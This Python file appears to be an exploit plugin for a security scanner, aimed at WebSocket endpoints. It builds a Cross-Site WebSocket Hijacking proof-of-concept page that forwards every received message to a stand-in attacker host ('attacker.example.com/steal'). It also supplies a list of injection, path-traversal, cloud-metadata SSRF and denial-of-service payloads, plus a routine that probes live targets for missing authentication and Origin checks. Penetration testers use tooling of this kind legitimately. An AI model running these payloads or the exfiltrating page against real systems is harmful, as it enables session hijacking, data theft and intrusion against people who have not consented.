"""
WebSocket Exploit Plugin

Provides exploit capabilities for WebSocket security issues:
- Cross-Site WebSocket Hijacking (CSWSH) PoC generation
- Missing authentication checks
- Message injection
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


def _cswsh_poc(ws_url: str) -> str:
    """Generate a Cross-Site WebSocket Hijacking PoC HTML page."""
    return f'''<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h2>Cross-Site WebSocket Hijacking PoC</h2>
<p id="output">Connecting...</p>
<script>
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
  document.getElementById("output").innerText = "Connected!";
  ws.send(JSON.stringify({{type: "ping"}}));
}};
ws.onmessage = function(e) {{
  document.getElementById("output").innerText = "Data received: " + e.data;
  fetch("https://attacker.example.com/steal?data=" + encodeURIComponent(e.data));
}};
ws.onerror = function(e) {{
  document.getElementById("output").innerText = "Error: " + e;
}};
</script>
</body>
</html>'''


class WebSocketPlugin(ExploitPlugin):
    """WebSocket exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'websocket'

    @property
    def name(self) -> str:
        return 'WebSocket Exploit'

    @property
    def description(self) -> str:
        return 'WebSocket exploit: CSWSH PoC, missing auth detection, message injection.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return WebSocket attack payloads."""
        context = context or {}
        ws_url = context.get('ws_url', 'ws://target.example.com/ws')
        return [
            _cswsh_poc(ws_url),
            '{"type":"ping"}',
            '{"type":"subscribe","channel":"*"}',
            '{"cmd":"ls"}',
            '<script>alert(1)</script>',
            # Message injection payloads
            '{"type":"message","data":"<img src=x onerror=alert(1)>"}',
            '{"action":"admin","role":"administrator"}',
            '{"type":"auth","token":""}',
            '{"type":"auth","token":"null"}',
            '{"userId":1,"action":"getAll"}',
            '{"userId":"1 OR 1=1","action":"get"}',
            # Authentication bypass payloads
            '{"type":"login","username":"admin","password":""}',
            '{"auth":null}',
            '{"session":"../../../etc/passwd"}',
            # SSRF via WebSocket
            '{"url":"http://169.254.169.254/latest/meta-data/"}',
            '{"endpoint":"http://localhost:8080/admin"}',
            # DoS payloads
            '{"type":"subscribe","channel":"' + 'A' * 1000 + '"}',
            '{"query":"' + '{' * 20 + '__typename' + '}' * 20 + '"}',
            # Origin bypass probe
            '{"type":"handshake","origin":"null"}',
            # Protocol abuse
            '{"type":"upgrade","protocol":"ws"}',
            '{"type":"broadcast","data":"test","target":"*"}',
        ]

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Check WebSocket upgrade endpoint for missing auth. Falls back to HTTP check
        when websocket-client is not available.
        """
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        ws_url = vulnerability_data.get('ws_url', '')
        if not ws_url:
            # Derive ws_url from target_url
            ws_url = target_url.replace('https://', 'wss://').replace('http://', 'ws://')

        # Generate CSWSH PoC HTML regardless
        poc_html = _cswsh_poc(ws_url)

        # Try websocket-client if available
        try:
            import websocket  # type: ignore

            def _on_open(ws):
                ws.send('{"type":"ping"}')

            messages = []

            def _on_message(ws, message):
                messages.append(message)
                ws.close()

            ws = websocket.WebSocketApp(
                ws_url,
                on_open=_on_open,
                on_message=_on_message,
            )
            ws.run_forever(sslopt={'check_hostname': False} if not verify_ssl else {})

            if messages:
                return {
                    'success': True,
                    'vulnerability_type': 'websocket',
                    'attack': 'unauthenticated_connection',
                    'evidence': f'Connected to WebSocket without authentication; received: {messages[0][:200]}',
                    'poc_html': poc_html,
                    'message': 'WebSocket accepts unauthenticated connections',
                }
        except ImportError:
            logger.debug("websocket-client not available; using HTTP fallback")
        except Exception as e:
            logger.debug(f"WebSocket connect error: {e}")

        # HTTP fallback: send upgrade request without Origin
        if HAS_REQUESTS:
            try:
                headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                }
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code == 101:
                    return {
                        'success': True,
                        'vulnerability_type': 'websocket',
                        'attack': 'upgrade_without_origin',
                        'evidence': 'WebSocket upgrade accepted without Origin header validation',
                        'poc_html': poc_html,
                        'message': 'WebSocket missing Origin validation',
                    }
            except Exception as e:
                logger.debug(f"WebSocket HTTP fallback error: {e}")

        # Return PoC anyway as informational
        return {
            'success': False,
            'error': 'Could not confirm WebSocket vulnerability automatically',
            'vulnerability_type': 'websocket',
            'poc_html': poc_html,
        }
